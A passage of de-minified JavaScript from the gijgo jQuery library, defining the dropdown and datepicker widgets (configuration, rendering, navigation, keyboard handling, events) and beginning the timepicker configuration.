    iconsLibrary: "glyphicons"
  },
  bootstrap4: {
    style: {
      wrapper: "gj-dropdown gj-dropdown-bootstrap gj-dropdown-bootstrap-4 gj-unselectable",
      presenter: "btn btn-outline-secondary",
      list: "gj-list gj-list-bootstrap gj-dropdown-list-bootstrap list-group",
      item: "list-group-item",
      active: "active"
    }
  },
  materialicons: {
    style: {
      expander: "gj-dropdown-expander-mi"
    }
  },
  fontawesome: {
    icons: {
      dropdown: '<i class="fa fa-caret-down" aria-hidden="true"></i>',
      dropup: '<i class="fa fa-caret-up" aria-hidden="true"></i>'
    },
    style: {
      expander: "gj-dropdown-expander-fa"
    }
  },
  glyphicons: {
    icons: {
      dropdown: '<span class="caret"></span>',
      dropup: '<span class="dropup"><span class="caret" ></span></span>'
    },
    style: {
      expander: "gj-dropdown-expander-glyphicons"
    }
  }
}, gj.dropdown.methods = {
  init: function (e) {
    return gj.widget.prototype.init.call(this, e, "dropdown"), this.attr("data-dropdown", "true"), gj.dropdown.methods.initialize(this), this;
  },
  getHTMLConfig: function () {
    var e = gj.widget.prototype.getHTMLConfig.call(this),
      t = this[0].attributes;
    return t.placeholder && (e.placeholder = t.placeholder.value), e;
  },
  initialize: function (t) {
    var e = t.data(),
      n = t.parent('div[role="wrapper"]'),
      i = $('<span role="display"></span>'),
      o = $('<span role="expander">' + e.icons.dropdown + "</span>").addClass(e.style.expander),
      r = $('<button role="presenter" type="button"></button>').addClass(e.style.presenter),
      a = $('<ul role="list" class="' + e.style.list + '"></ul>').attr("guid", t.attr("data-guid"));
    0 === n.length ? (n = $('<div role="wrapper" />').addClass(e.style.wrapper), t.wrap(n)) : n.addClass(e.style.wrapper), e.fontSize && r.css("font-size", e.fontSize), r.on("click", function (e) {
      a.is(":visible") ? gj.dropdown.methods.close(t, a) : gj.dropdown.methods.open(t, a);
    }), r.on("blur", function (e) {
      setTimeout(function () {
        gj.dropdown.methods.close(t, a);
      }, 500);
    }), r.append(i).append(o), t.hide(), t.after(r), $("body").append(a), a.hide(), t.reload();
  },
  setListPosition: function (e, t, n) {
    var i,
      o,
      r,
      a,
      s = e.getBoundingClientRect(),
      l = window.scrollY || window.pageYOffset || 0;
    window.scrollX || window.pageXOffset, t.style.overflow = "", t.style.overflowX = "", t.style.height = "", a = t.getBoundingClientRect(), o = gj.core.height(e, !0), "auto" === n.maxHeight ? s.top < a.top ? s.top + i + o > window.innerHeight && (r = window.innerHeight - s.top - o - 3) : 0 < s.top - i - 3 ? t.style.top = Math.round(s.top + l - i - 3) + "px" : (t.style.top = l + "px", r = s.top - 3) : !isNaN(n.maxHeight) && n.maxHeight < i && (r = n.maxHeight), r && (t.style.overflow = "scroll", t.style.overflowX = "hidden", t.style.height = r + "px");
  },
  useHtmlDataSource: function (e, t) {
    var n,
      i,
      o = [],
      r = e.find("option");
    for (n = 0; n < r.length; n++) (i = {})[t.valueField] = r[n].value, i[t.textField] = r[n].innerHTML, i[t.selectedField] = e[0].value === r[n].value, o.push(i);
    t.dataSource = o;
  },
  filter: function (e) {
    var t,
      n,
      i = e.data();
    if (i.dataSource) {
      if ("string" == typeof i.dataSource[0]) for (t = 0; t < i.dataSource.length; t++) (n = {})[i.valueField] = i.dataSource[t], n[i.textField] = i.dataSource[t], i.dataSource[t] = n;
    } else i.dataSource = [];
    return i.dataSource;
  },
  render: function (o, e) {
    var r = [],
      a = o.data(),
      t = o.parent(),
      s = $("body").children('[role="list"][guid="' + o.attr("data-guid") + '"]'),
      n = t.children('[role="presenter"]'),
      l = (n.children('[role="expander"]'), n.children('[role="display"]'));
    if (o.data("records", e), o.empty(), s.empty(), e && e.length) if ($.each(e, function () {
      var e,
        t = this[a.valueField],
        n = this[a.textField],
        i = this[a.selectedField] && "true" === this[a.selectedField].toString().toLowerCase();
      (e = $('<li value="' + t + '"><div data-role="wrapper"><span data-role="display">' + n + "</span></div></li>")).addClass(a.style.item), e.on("click", function (e) {
        gj.dropdown.methods.select(o, t);
      }), s.append(e), o.append('<option value="' + t + '">' + n + "</option>"), i && r.push(t);
    }), 0 === r.length) o.prepend('<option value=""></option>'), o[0].selectedIndex = 0, a.placeholder && (l[0].innerHTML = '<span class="placeholder">' + a.placeholder + "</span>");else for (i = 0; i < r.length; i++) gj.dropdown.methods.select(o, r[i]);
    return a.width && (t.css("width", a.width), n.css("width", a.width)), a.fontSize && s.children("li").css("font-size", a.fontSize), gj.dropdown.events.dataBound(o), o;
  },
  open: function (e, t) {
    var n = e.data(),
      i = e.parent().find('[role="expander"]'),
      o = e.parent().find('[role="presenter"]'),
      r = gj.core.getScrollParent(e[0]);
    t.css("width", gj.core.width(o[0])), t.show(), gj.dropdown.methods.setListPosition(o[0], t[0], n), i.html(n.icons.dropup), r && (n.parentScrollHandler = function () {
      gj.dropdown.methods.setListPosition(o[0], t[0], n);
    }, gj.dropdown.methods.addParentsScrollListener(r, n.parentScrollHandler));
  },
  close: function (e, t) {
    var n = e.data(),
      i = e.parent().find('[role="expander"]'),
      o = gj.core.getScrollParent(e[0]);
    i.html(n.icons.dropdown), o && n.parentScrollHandler && gj.dropdown.methods.removeParentsScrollListener(o, n.parentScrollHandler), t.hide();
  },
  addParentsScrollListener: function (e, t) {
    var n = gj.core.getScrollParent(e.parentNode);
    e.addEventListener("scroll", t), n && gj.dropdown.methods.addParentsScrollListener(n, t);
  },
  removeParentsScrollListener: function (e, t) {
    var n = gj.core.getScrollParent(e.parentNode);
    e.removeEventListener("scroll", t), n && gj.dropdown.methods.removeParentsScrollListener(n, t);
  },
  select: function (e, t) {
    var n = e.data(),
      i = $("body").children('[role="list"][guid="' + e.attr("data-guid") + '"]'),
      o = i.children('li[value="' + t + '"]'),
      r = e.next('[role="presenter"]').find('[role="display"]'),
      a = gj.dropdown.methods.getRecordByValue(e, t);
    return i.children("li").removeClass(n.style.active), a ? (o.addClass(n.style.active), e[0].value = t, r[0].innerHTML = a[n.textField]) : (n.placeholder && (r[0].innerHTML = '<span class="placeholder">' + n.placeholder + "</span>"), e[0].value = ""), gj.dropdown.events.change(e), gj.dropdown.methods.close(e, i), e;
  },
  getRecordByValue: function (e, t) {
    var n,
      i = e.data(),
      o = void 0;
    for (n = 0; n < i.records.length; n++) if (i.records[n][i.valueField] === t) {
      o = i.records[n];
      break;
    }
    return o;
  },
  value: function (e, t) {
    return void 0 === t ? e.val() : (gj.dropdown.methods.select(e, t), e);
  },
  destroy: function (e) {
    var t = e.data(),
      n = e.parent('div[role="wrapper"]');
    return t && (e.xhr && e.xhr.abort(), e.off(), e.removeData(), e.removeAttr("data-type").removeAttr("data-guid").removeAttr("data-dropdown"), e.removeClass(), 0 < n.length && (n.children('[role="presenter"]').remove(), n.children('[role="list"]').remove(), e.unwrap()), e.show()), e;
  }
}, gj.dropdown.events = {
  change: function (e) {
    return e.triggerHandler("change");
  },
  dataBound: function (e) {
    return e.triggerHandler("dataBound");
  }
}, gj.dropdown.widget = function (e, t) {
  var n = gj.dropdown.methods;
  return this.value = function (e) {
    return n.value(this, e);
  }, this.enable = function () {
    return n.enable(this);
  }, this.disable = function () {
    return n.disable(this);
  }, this.destroy = function () {
    return n.destroy(this);
  }, $.extend(e, this), "true" !== e.attr("data-dropdown") && n.init.call(e, t), e;
}, gj.dropdown.widget.prototype = new gj.widget(), gj.dropdown.widget.constructor = gj.dropdown.widget, gj.dropdown.widget.prototype.getHTMLConfig = gj.dropdown.methods.getHTMLConfig, jQuery.fn.dropdown = function (e) {
  var t;
  if (this && this.length) {
    if ("object" != typeof e && e) {
      if ((t = new gj.dropdown.widget(this, null))[e]) return t[e].apply(this, Array.prototype.slice.call(arguments, 1));
      throw "Method " + e + " does not exist.";
    }
    return new gj.dropdown.widget(this, e);
  }
}, gj.datepicker = {
  plugins: {}
}, gj.datepicker.config = {
  base: {
    showOtherMonths: !1,
    selectOtherMonths: !0,
    width: void 0,
    minDate: void 0,
    maxDate: void 0,
    format: "yyyy-mm-dd",
    uiLibrary: "materialdesign",
    iconsLibrary: "materialicons",
    value: void 0,
    weekStartDay: 0,
    disableDates: void 0,
    disableDaysOfWeek: void 0,
    calendarWeeks: !1,
    keyboardNavigation: !0,
    locale: "en-us",
    icons: {
      rightIcon: '<i class="gj-icon">event</i>',
      previousMonth: '<i class="fa fa-chevron-right"></i>',
      nextMonth: '<i class="fa fa-chevron-left"></i>'
    },
    fontSize: void 0,
    size: "default",
    modal: !1,
    header: !1,
    footer: !1,
    showOnFocus: !0,
    showRightIcon: !0,
    style: {
      modal: "gj-modal",
      wrapper: "gj-datepicker gj-datepicker-md gj-unselectable",
      input: "gj-textbox-md",
      calendar: "gj-picker gj-picker-md datepicker gj-unselectable",
      footer: "",
      button: "gj-button-md"
    }
  },
  bootstrap: {
    style: {
      wrapper: "gj-datepicker gj-datepicker-bootstrap gj-unselectable input-group",
      input: "form-control",
      calendar: "gj-picker gj-picker-bootstrap datepicker gj-unselectable",
      footer: "modal-footer",
      button: "btn btn-default"
    },
    iconsLibrary: "glyphicons",
    showOtherMonths: !0
  },
  bootstrap4: {
    style: {
      wrapper: "gj-datepicker gj-datepicker-bootstrap gj-unselectable input-group",
      input: "form-control",
      footer: "modal-footer",
      button: "btn btn-default"
    },
    showOtherMonths: !0
  },
  fontawesome: {
    icons: {
      previousMonth: '<i class="fa fa-chevron-right" aria-hidden="true"></i>',
      nextMonth: '<i class="fa fa-chevron-left" aria-hidden="true"></i>'
    }
  },
  glyphicons: {
    icons: {
      previousMonth: '<span class="glyphicon glyphicon-chevron-right"></span>',
      nextMonth: '<span class="glyphicon glyphicon-chevron-left"></span>'
    }
  }
}, gj.datepicker.methods = {
  init: function (e) {
    return gj.widget.prototype.init.call(this, e, "datepicker"), this.attr("data-datepicker", "true"), gj.datepicker.methods.initialize(this, this.data()), this;
  },
  initialize: function (t, n) {
    var e,
      i,
      o = t.parent('div[role="wrapper"]');
    0 === o.length ? (o = $('<div role="wrapper" />').addClass(n.style.wrapper), t.wrap(o)) : o.addClass(n.style.wrapper), o = t.parent('div[role="wrapper"]'), n.width && o.css("width", n.width), t.val(n.value).addClass(n.style.input).attr("role", "input"), n.fontSize && t.css("font-size", n.fontSize), "bootstrap" === n.uiLibrary || "bootstrap4" === n.uiLibrary ? "small" === n.size ? (o.addClass("input-group-sm"), t.addClass("form-control-sm")) : "large" === n.size && (o.addClass("input-group-lg"), t.addClass("form-control-lg")) : "small" === n.size ? o.addClass("small") : "large" === n.size && o.addClass("large"), n.showRightIcon && ((i = "bootstrap" === n.uiLibrary ? $('<span class="input-group-addon">' + n.icons.rightIcon + "</span>") : "bootstrap4" === n.uiLibrary ? $('<span class="input-group-append"><button class="btn btn-outline-secondary calender-button" type="button">' + n.icons.rightIcon + "</button></span>") : $(n.icons.rightIcon)).attr("role", "right-icon"), i.on("click", function (e) {
      $("body").find('[role="calendar"][guid="' + t.attr("data-guid") + '"]').is(":visible") ? gj.datepicker.methods.close(t) : gj.datepicker.methods.open(t, n);
    }), o.append(i)), n.showOnFocus && t.on("focus", function () {
      gj.datepicker.methods.open(t, n);
    }), e = gj.datepicker.methods.createCalendar(t, n), !0 !== n.footer && (t.on("blur", function () {
      t.timeout = setTimeout(function () {
        gj.datepicker.methods.close(t);
      }, 500);
    }), e.mousedown(function () {
      return clearTimeout(t.timeout), document.activeElement !== t[0] && t.focus(), !1;
    }), e.on("click", function () {
      clearTimeout(t.timeout), document.activeElement !== t[0] && t.focus();
    })), n.keyboardNavigation && $(document).on("keydown", gj.datepicker.methods.createKeyDownHandler(t, e, n));
  },
  createCalendar: function (i, o) {
    var e,
      t,
      n,
      r,
      a,
      s = $('<div role="calendar" type="month"/>').addClass(o.style.calendar).attr("guid", i.attr("data-guid"));
    return o.fontSize && s.css("font-size", o.fontSize), !(e = gj.core.parseDate(o.value, o.format, o.locale)) || isNaN(e.getTime()) ? e = new Date() : i.attr("day", e.getFullYear() + "-" + e.getMonth() + "-" + e.getDate()), s.attr("month", e.getMonth()), s.attr("year", e.getFullYear()), gj.datepicker.methods.renderHeader(i, s, o, e), t = $('<div role="body" />'), s.append(t), o.footer && (n = $('<div role="footer" class="' + o.style.footer + '" />'), (r = $('<button class="' + o.style.button + '">' + gj.core.messages[o.locale].cancel + "</button>")).on("click", function () {
      i.close();
    }), n.append(r), (a = $('<button class="' + o.style.button + '">' + gj.core.messages[o.locale].ok + "</button>")).on("click", function () {
      var e,
        t,
        n = s.attr("selectedDay");
      n ? (t = n.split("-"), e = new Date(t[0], t[1], t[2], s.attr("hour") || 0, s.attr("minute") || 0), gj.datepicker.methods.change(i, s, o, e)) : i.close();
    }), n.append(a), s.append(n)), s.hide(), $(".search-picker").append(s), o.modal && (s.wrapAll('<div role="modal" class="' + o.style.modal + '"/>'), gj.core.center(s)), s;
  },
  renderHeader: function (e, t, n, i) {
    var o, r, a;
    n.header && (o = $('<div role="header" />'), (a = $('<div role="year" />').on("click", function () {
      gj.datepicker.methods.renderDecade(e, t, n), a.addClass("selected"), r.removeClass("selected");
    })).html(gj.core.formatDate(i, "yyyy", n.locale)), o.append(a), (r = $('<div role="date" class="selected" />').on("click", function () {
      gj.datepicker.methods.renderMonth(e, t, n), r.addClass("selected"), a.removeClass("selected");
    })).html(gj.core.formatDate(i, "ddd, mmm dd", n.locale)), o.append(r), t.append(o));
  },
  updateHeader: function (e, t, n) {
    e.find('[role="header"] [role="year"]').removeClass("selected").html(gj.core.formatDate(n, "yyyy", t.locale)), e.find('[role="header"] [role="date"]').addClass("selected").html(gj.core.formatDate(n, "ddd, mmm dd", t.locale)), e.find('[role="header"] [role="hour"]').removeClass("selected").html(gj.core.formatDate(n, "HH", t.locale)), e.find('[role="header"] [role="minute"]').removeClass("selected").html(gj.core.formatDate(n, "MM", t.locale));
  },
  createNavigation: function (e, t, n, o) {
    var r,
      a,
      s = $("<thead/>");
    for ((a = $('<div role="navigator" />')).append($("<div>" + o.icons.previousMonth + "</div>").on("click", gj.datepicker.methods.prev(e, o))), a.append($('<div role="period"></div>').on("click", gj.datepicker.methods.changePeriod(e, o))), a.append($("<div>" + o.icons.nextMonth + "</div>").on("click", gj.datepicker.methods.next(e, o))), t.append(a), r = $('<tr role="week-days" />'), o.calendarWeeks && r.append("<th><div>&nbsp;</div></th>"), i = o.weekStartDay; i < gj.core.messages[o.locale].weekDaysMin.length; i++) r.append("<th><div>" + gj.core.messages[o.locale].weekDaysMin[i] + "</div></th>");
    for (i = 0; i < o.weekStartDay; i++) r.append("<th><div>" + gj.core.messages[o.locale].weekDaysMin[i] + "</div></th>");
    s.append(r), n.append(s);
  },
  renderMonth: function (e, t, n) {
    var i,
      o,
      r,
      a,
      s,
      l,
      d,
      c,
      u,
      p,
      h,
      f,
      g,
      m,
      v,
      y = t.children('[role="body"]'),
      b = $("<table/>"),
      w = $("<tbody/>"),
      x = gj.core.messages[n.locale].titleFormat;
    for (y.off().empty(), gj.datepicker.methods.createNavigation(e, y, b, n), a = parseInt(t.attr("month"), 10), s = parseInt(t.attr("year"), 10), t.attr("type", "month"), x = x.replace("mmmm", gj.core.messages[n.locale].monthNames[a]).replace("yyyy", s), t.find('div[role="period"]').text(x), l = new Array(31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31), s % 4 == 0 && 1900 != s && (l[1] = 29), d = l[a], c = (new Date(s, a, 1).getDay() + 7 - n.weekStartDay) % 7, i = 0, $row = $("<tr />"), h = gj.datepicker.methods.getPrevMonth(a, s), u = 1; u <= c; u++) r = l[h.month] - c + u, v = new Date(h.year, h.month, r), n.calendarWeeks && 1 === u && $row.append('<td class="calendar-week"><div>' + gj.datepicker.methods.getWeekNumber(v) + "</div></td>"), g = $('<td class="other-month" />'), n.showOtherMonths && (m = $("<div>" + r + "</div>"), g.append(m), n.selectOtherMonths && gj.datepicker.methods.isSelectable(n, v) ? (g.addClass("gj-cursor-pointer").attr("day", r).attr("month", h.month).attr("year", h.year), m.on("click", gj.datepicker.methods.dayClickHandler(e, t, n, v)), m.on("mousedown", function (e) {
      e.stopPropagation();
    })) : g.addClass("disabled")), $row.append(g), i++;
    for (1 < u && w.append($row), p = new Date(), u = 1; u <= d; u++) v = new Date(s, a, u), 0 == i && ($row = $("<tr>"), n.calendarWeeks && $row.append('<td class="calendar-week"><div>' + gj.datepicker.methods.getWeekNumber(v) + "</div></td>")), g = $('<td day="' + u + '" month="' + a + '" year="' + s + '" />'), s === p.getFullYear() && a === p.getMonth() && u === p.getDate() ? g.addClass("today") : g.addClass("current-month"), m = $("<div>" + u + "</div>"), gj.datepicker.methods.isSelectable(n, v) ? (g.addClass("gj-cursor-pointer"), m.on("click", gj.datepicker.methods.dayClickHandler(e, t, n, v)), m.on("mousedown", function (e) {
      e.stopPropagation();
    })) : g.addClass("disabled"), g.append(m), $row.append(g), 7 == ++i && (w.append($row), i = 0);
    for (f = gj.datepicker.methods.getNextMonth(a, s), u = 1; 0 != i; u++) v = new Date(f.year, f.month, u), g = $('<td class="other-month" />'), n.showOtherMonths && (m = $("<div>" + u + "</div>"), n.selectOtherMonths && gj.datepicker.methods.isSelectable(n, v) ? (g.addClass("gj-cursor-pointer").attr("day", u).attr("month", f.month).attr("year", f.year), m.on("click", gj.datepicker.methods.dayClickHandler(e, t, n, v)), m.on("mousedown", function (e) {
      e.stopPropagation();
    })) : g.addClass("disabled"), g.append(m)), $row.append(g), 7 == ++i && (w.append($row), i = 0);
    b.append(w), y.append(b), t.attr("selectedDay") && (o = t.attr("selectedDay").split("-"), v = new Date(o[0], o[1], o[2], t.attr("hour") || 0, t.attr("minute") || 0), t.find('tbody td[day="' + o[2] + '"][month="' + o[1] + '"]').addClass("selected"), gj.datepicker.methods.updateHeader(t, n, v));
  },
  renderYear: function (e, t, n) {
    var i,
      o,
      r,
      a,
      s = t.find('>[role="body"]>table'),
      l = s.children("tbody");
    for (s.children("thead").hide(), i = parseInt(t.attr("year"), 10), t.attr("type", "year"), t.find('div[role="period"]').text(i), l.empty(), o = 0; o < 3; o++) {
      for ($row = $("<tr />"), r = 4 * o; r <= 4 * o + 3; r++) (a = $("<div>" + gj.core.messages[n.locale].monthShortNames[r] + "</div>")).on("click", gj.datepicker.methods.selectMonth(e, t, n, r)), $cell = $("<td></td>").append(a), $row.append($cell);
      l.append($row);
    }
  },
  renderDecade: function (e, t, n) {
    var i,
      o,
      r,
      a,
      s,
      l = t.find('>[role="body"]>table'),
      d = l.children("tbody");
    for (l.children("thead").hide(), o = (i = parseInt(t.attr("year"), 10)) - i % 10, t.attr("type", "decade"), t.find('div[role="period"]').text(o + " - " + (9 + o)), d.empty(), r = o - 1; r <= 10 + o; r += 4) {
      for ($row = $("<tr />"), a = r; a <= r + 3; a++) (s = $("<div>" + a + "</div>")).on("click", gj.datepicker.methods.selectYear(e, t, n, a)), $cell = $("<td></td>").append(s), $row.append($cell);
      d.append($row);
    }
  },
  renderCentury: function (e, t, n) {
    var i,
      o,
      r,
      a,
      s,
      l = t.find('>[role="body"]>table'),
      d = l.children("tbody");
    for (l.children("thead").hide(), o = (i = parseInt(t.attr("year"), 10)) - i % 100, t.attr("type", "century"), t.find('div[role="period"]').text(o + " - " + (99 + o)), d.empty(), r = o - 10; r < 100 + o; r += 40) {
      for ($row = $("<tr />"), a = r; a <= r + 30; a += 10) (s = $("<div>" + a + "</div>")).on("click", gj.datepicker.methods.selectDecade(e, t, n, a)), $cell = $("<td></td>").append(s), $row.append($cell);
      d.append($row);
    }
  },
  getWeekNumber: function (e) {
    var t = new Date(e.valueOf());
    t.setDate(t.getDate() + 6), (t = new Date(Date.UTC(t.getFullYear(), t.getMonth(), t.getDate()))).setUTCDate(t.getUTCDate() + 4 - (t.getUTCDay() || 7));
    var n = new Date(Date.UTC(t.getUTCFullYear(), 0, 1));
    return Math.ceil(((t - n) / 864e5 + 1) / 7);
  },
  getMinDate: function (e) {
    var t;
    return e.minDate && ("string" == typeof e.minDate ? t = gj.core.parseDate(e.minDate, e.format, e.locale) : "function" == typeof e.minDate ? "string" == typeof (t = e.minDate()) && (t = gj.core.parseDate(t, e.format, e.locale)) : "function" == typeof e.minDate.getMonth && (t = e.minDate)), t;
  },
  getMaxDate: function (e) {
    var t;
    return e.maxDate && ("string" == typeof e.maxDate ? t = gj.core.parseDate(e.maxDate, e.format, e.locale) : "function" == typeof e.maxDate ? "string" == typeof (t = e.maxDate()) && (t = gj.core.parseDate(t, e.format, e.locale)) : "function" == typeof e.maxDate.getMonth && (t = e.maxDate)), t;
  },
  isSelectable: function (e, t) {
    var n,
      i = !0,
      o = gj.datepicker.methods.getMinDate(e),
      r = gj.datepicker.methods.getMaxDate(e);
    if (o && t < o ? i = !1 : r && r < t && (i = !1), i) {
      if (e.disableDates) if ($.isArray(e.disableDates)) for (n = 0; n < e.disableDates.length; n++) e.disableDates[n] instanceof Date && e.disableDates[n].getTime() === t.getTime() ? i = !1 : "string" == typeof e.disableDates[n] && gj.core.parseDate(e.disableDates[n], e.format, e.locale).getTime() === t.getTime() && (i = !1);else e.disableDates instanceof Function && (i = e.disableDates(t));
      $.isArray(e.disableDaysOfWeek) && -1 < e.disableDaysOfWeek.indexOf(t.getDay()) && (i = !1);
    }
    return i;
  },
  getPrevMonth: function (e, t) {
    return date = new Date(t, e, 1), date.setMonth(date.getMonth() - 1), {
      month: date.getMonth(),
      year: date.getFullYear()
    };
  },
  getNextMonth: function (e, t) {
    return date = new Date(t, e, 1), date.setMonth(date.getMonth() + 1), {
      month: date.getMonth(),
      year: date.getFullYear()
    };
  },
  prev: function (a, s) {
    return function () {
      var e,
        t,
        n,
        i,
        o,
        r = $("body").find('[role="calendar"][guid="' + a.attr("data-guid") + '"]');
      switch (n = parseInt(r.attr("year"), 10), r.attr("type")) {
        case "month":
          t = parseInt(r.attr("month"), 10), e = gj.datepicker.methods.getPrevMonth(t, n), r.attr("month", e.month), r.attr("year", e.year), gj.datepicker.methods.renderMonth(a, r, s);
          break;
        case "year":
          r.attr("year", n - 1), gj.datepicker.methods.renderYear(a, r, s);
          break;
        case "decade":
          i = n - n % 10, r.attr("year", i - 10), gj.datepicker.methods.renderDecade(a, r, s);
          break;
        case "century":
          o = n - n % 100, r.attr("year", o - 100), gj.datepicker.methods.renderCentury(a, r, s);
      }
    };
  },
  next: function (a, s) {
    return function () {
      var e,
        t,
        n,
        i,
        o,
        r = $("body").find('[role="calendar"][guid="' + a.attr("data-guid") + '"]');
      switch (n = parseInt(r.attr("year"), 10), r.attr("type")) {
        case "month":
          t = parseInt(r.attr("month"), 10), e = gj.datepicker.methods.getNextMonth(t, n), r.attr("month", e.month), r.attr("year", e.year), gj.datepicker.methods.renderMonth(a, r, s);
          break;
        case "year":
          r.attr("year", n + 1), gj.datepicker.methods.renderYear(a, r, s);
          break;
        case "decade":
          i = n - n % 10, r.attr("year", 10 + i), gj.datepicker.methods.renderDecade(a, r, s);
          break;
        case "century":
          o = n - n % 100, r.attr("year", 100 + o), gj.datepicker.methods.renderCentury(a, r, s);
      }
    };
  },
  changePeriod: function (n, i) {
    return function (e) {
      var t = $("body").find('[role="calendar"][guid="' + n.attr("data-guid") + '"]');
      switch (t.attr("type")) {
        case "month":
          gj.datepicker.methods.renderYear(n, t, i);
          break;
        case "year":
          gj.datepicker.methods.renderDecade(n, t, i);
          break;
        case "decade":
          gj.datepicker.methods.renderCentury(n, t, i);
      }
    };
  },
  dayClickHandler: function (t, n, i, o) {
    return function (e) {
      return e && e.stopPropagation(), gj.datepicker.methods.selectDay(t, n, i, o), !0 !== i.footer && !1 !== i.autoClose && gj.datepicker.methods.change(t, n, i, o), t;
    };
  },
  change: function (e, t, n, i) {
    var o = (i.getDate(), i.getMonth()),
      r = i.getFullYear(),
      a = gj.core.formatDate(i, n.format, n.locale);
    t.attr("month", o), t.attr("year", r), e.val(a), gj.datepicker.events.change(e), "none" !== window.getComputedStyle(t[0]).display && gj.datepicker.methods.close(e);
  },
  selectDay: function (e, t, n, i) {
    var o = i.getDate(),
      r = i.getMonth(),
      a = i.getFullYear();
    t.attr("selectedDay", a + "-" + r + "-" + o), t.find("tbody td").removeClass("selected"), t.find('tbody td[day="' + o + '"][month="' + r + '"]').addClass("selected"), gj.datepicker.methods.updateHeader(t, n, i), gj.datepicker.events.select(e, "day");
  },
  selectMonth: function (t, n, i, o) {
    return function (e) {
      n.attr("month", o), gj.datepicker.methods.renderMonth(t, n, i), gj.datepicker.events.select(t, "month");
    };
  },
  selectYear: function (t, n, i, o) {
    return function (e) {
      n.attr("year", o), gj.datepicker.methods.renderYear(t, n, i), gj.datepicker.events.select(t, "year");
    };
  },
  selectDecade: function (t, n, i, o) {
    return function (e) {
      n.attr("year", o), gj.datepicker.methods.renderDecade(t, n, i), gj.datepicker.events.select(t, "decade");
    };
  },
  open: function (e, t) {
    var n,
      i = $("body").find('[role="calendar"][guid="' + e.attr("data-guid") + '"]');
    switch (e.val() ? e.value(e.val()) : (n = new Date(), i.attr("month", n.getMonth()), i.attr("year", n.getFullYear())), i.attr("type")) {
      case "month":
        gj.datepicker.methods.renderMonth(e, i, t);
        break;
      case "year":
        gj.datepicker.methods.renderYear(e, i, t);
        break;
      case "decade":
        gj.datepicker.methods.renderDecade(e, i, t);
        break;
      case "century":
        gj.datepicker.methods.renderCentury(e, i, t);
    }
    i.show(), i.closest('div[role="modal"]').show(), t.modal ? gj.core.center(i) : clearTimeout(e.timeout), gj.datepicker.events.open(e);
  },
  close: function (e) {
    var t = $("body").find('[role="calendar"][guid="' + e.attr("data-guid") + '"]');
    t.hide(), t.closest('div[role="modal"]').hide(), gj.datepicker.events.close(e);
  },
  createKeyDownHandler: function (s, l, d) {
    return function (e) {
      var t, n, i, o, r, a;
      e = e || window.event;
      "none" !== window.getComputedStyle(l[0]).display && (a = gj.datepicker.methods.getActiveCell(l), "38" == e.keyCode ? (o = a.index(), (r = a.closest("tr").prev("tr").find("td:eq(" + o + ")")).is("[day]") || (gj.datepicker.methods.prev(s, d)(), (r = l.find("tbody tr").last().find("td:eq(" + o + ")")).is(":empty") && (r = l.find("tbody tr").last().prev().find("td:eq(" + o + ")"))), r.is("[day]") && (r.addClass("focused"), a.removeClass("focused"))) : "40" == e.keyCode ? (o = a.index(), (r = a.closest("tr").next("tr").find("td:eq(" + o + ")")).is("[day]") || (gj.datepicker.methods.next(s, d)(), (r = l.find("tbody tr").first().find("td:eq(" + o + ")")).is("[day]") || (r = l.find("tbody tr:eq(1)").find("td:eq(" + o + ")"))), r.is("[day]") && (r.addClass("focused"), a.removeClass("focused"))) : "37" == e.keyCode ? (0 === (r = a.prev("td[day]:not(.disabled)")).length && (r = a.closest("tr").prev("tr").find("td[day]").last()), 0 === r.length && (gj.datepicker.methods.prev(s, d)(), r = l.find("tbody tr").last().find("td[day]").last()), 0 < r.length && (r.addClass("focused"), a.removeClass("focused"))) : "39" == e.keyCode ? (0 === (r = a.next("[day]:not(.disabled)")).length && (r = a.closest("tr").next("tr").find("td[day]").first()), 0 === r.length && (gj.datepicker.methods.next(s, d)(), r = l.find("tbody tr").first().find("td[day]").first()), 0 < r.length && (r.addClass("focused"), a.removeClass("focused"))) : "13" == e.keyCode ? (i = parseInt(a.attr("day"), 10), t = parseInt(a.attr("month"), 10), n = parseInt(a.attr("year"), 10), gj.datepicker.methods.dayClickHandler(s, l, d, new Date(n, t, i))()) : "27" == e.keyCode && s.close());
    };
  },
  getActiveCell: function (e) {
    var t = e.find("td[day].focused");
    return 0 === t.length && 0 === (t = e.find("td[day].selected")).length && 0 === (t = e.find("td[day].today")).length && (t = e.find("td[day]:not(.disabled)").first()), t;
  },
  value: function (e, t) {
    var n,
      i,
      o = e.data();
    return void 0 === t ? e.val() : ((i = gj.core.parseDate(t, o.format, o.locale)) && i.getTime() ? (n = $("body").find('[role="calendar"][guid="' + e.attr("data-guid") + '"]'), gj.datepicker.methods.dayClickHandler(e, n, o, i)()) : e.val(""), e);
  },
  destroy: function (e) {
    var t = e.data(),
      n = e.parent(),
      i = $("body").find('[role="calendar"][guid="' + e.attr("data-guid") + '"]');
    return t && (e.off(), 0 < i.parent('[role="modal"]').length && i.unwrap(), i.remove(), e.removeData(), e.removeAttr("data-type").removeAttr("data-guid").removeAttr("data-datepicker"), e.removeClass(), n.children('[role="right-icon"]').remove(), e.unwrap()), e;
  }
}, gj.datepicker.events = {
  change: function (e) {
    return e.triggerHandler("change");
  },
  select: function (e, t) {
    return e.triggerHandler("select", [t]);
  },
  open: function (e) {
    return e.triggerHandler("open");
  },
  close: function (e) {
    return e.triggerHandler("close");
  }
}, gj.datepicker.widget = function (e, t) {
  var n = gj.datepicker.methods;
  return this.value = function (e) {
    return n.value(this, e);
  }, this.destroy = function () {
    return n.destroy(this);
  }, this.open = function () {
    return n.open(this, this.data());
  }, this.close = function () {
    return n.close(this);
  }, $.extend(e, this), "true" !== e.attr("data-datepicker") && n.init.call(e, t), e;
}, gj.datepicker.widget.prototype = new gj.widget(), gj.datepicker.widget.constructor = gj.datepicker.widget, jQuery.fn.datepicker = function (e) {
  var t;
  if (this && this.length) {
    if ("object" != typeof e && e) {
      if ((t = new gj.datepicker.widget(this, null))[e]) return t[e].apply(this, Array.prototype.slice.call(arguments, 1));
      throw "Method " + e + " does not exist.";
    }
    return new gj.datepicker.widget(this, e);
  }
}, gj.timepicker = {
  plugins: {}
}, gj.timepicker.config = {
  base: {
    width: void 0,
    modal: !0,
    header: !0,
    footer: !0,
    format: "HH:MM",
    uiLibrary: "materialdesign",
    value: void 0,
    mode: "ampm",
    locale: "en-us",
    size: "default",
    icons: {
      rightIcon: '<i class="gj-icon clock" />'
    },
    style: {
      modal: "gj-modal",
      wrapper: "gj-timepicker gj-timepicker-md gj-unselectable",
      input: "gj-textbox-md",
      clock: "gj-picker gj-picker-md timepicker",
      footer: "",
